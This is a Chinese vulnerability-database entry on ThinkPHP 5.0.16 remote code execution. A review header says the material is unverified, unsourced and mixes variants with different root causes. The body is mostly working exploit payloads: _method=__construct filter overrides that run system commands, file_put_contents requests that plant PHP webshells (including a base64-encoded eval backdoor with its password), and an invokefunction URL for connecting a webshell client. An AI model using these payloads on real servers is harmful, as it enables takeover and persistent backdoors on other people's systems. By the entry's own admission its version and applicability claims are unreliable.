---
source: "hatch 补库批 20260928"
product: "ThinkPHP / Request覆盖与控制器反射"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Thinkphp 5.0.16"
prerequisites: "来源所述条件，未列明部分仍待核：仅标题 5.0.16；无完整影响/修复范围，未独立证实该版本可利用"
side_effects: "未执行；本文需注意的操作影响：前提、证据和归属不足；除共享四条/captcha外，新增绝对路径base64写入与GET assert入口，混入另一根因且无来源"
source_status: "unknown"
id: "vw-c3be2bb453b69a91c6dfbfc4"
entity_id: "ve-c3be2bb453b69a91c6dfbfc4"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：仅标题 5.0.16；无完整影响/修复范围，未独立证实该版本可利用

代码与实验材料：已全文读取全部载荷；仅静态分析，没有实验响应；部分包含写文件/下载副作用

来源证据范围：只有hatch补库标签，无原作者或原始漏洞资料

- **适用与权限边界（1）**：前提、证据和归属不足；依据：除共享四条/captcha外，新增绝对路径base64写入与GET assert入口，混入另一根因且无来源。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **适用与权限边界（2）**：以单版本拆文件造成重复和误导；依据：简介及影响范围为空，标题版本不能代替实际组件/配置验证。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Thinkphp 5.0.16

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

> https://www.0-sec.org/?s=index/index

    post

    s=whoami&_method=__construct&method=POST&filter[]=system
    aaaa=whoami&_method=__construct&method=GET&filter[]=system
    _method=__construct&method=GET&filter[]=system&get[]=whoami
    c=system&f=calc&_method=filter

> 写shell

    POST

    s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert

> 有captcha路由时无需debug=true
>
> https://www.0-sec.org/?s=captcha/calc

    POST 

    _method=__construct&filter[]=system&method=GET

> 写shell

    post

    s=file_put_contents('/绝对路径/test.php',base64_decode('PD9waHAgJHBhc3M9JF9QT1NUWydhYWFhJ107ZXZhbCgkcGFzcyk7Pz4'))&_method=__construct&filter=assert    

    密码aaaa

> 直接菜刀连

    http://wwww.0-sec.org/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=eval($_POST[1])
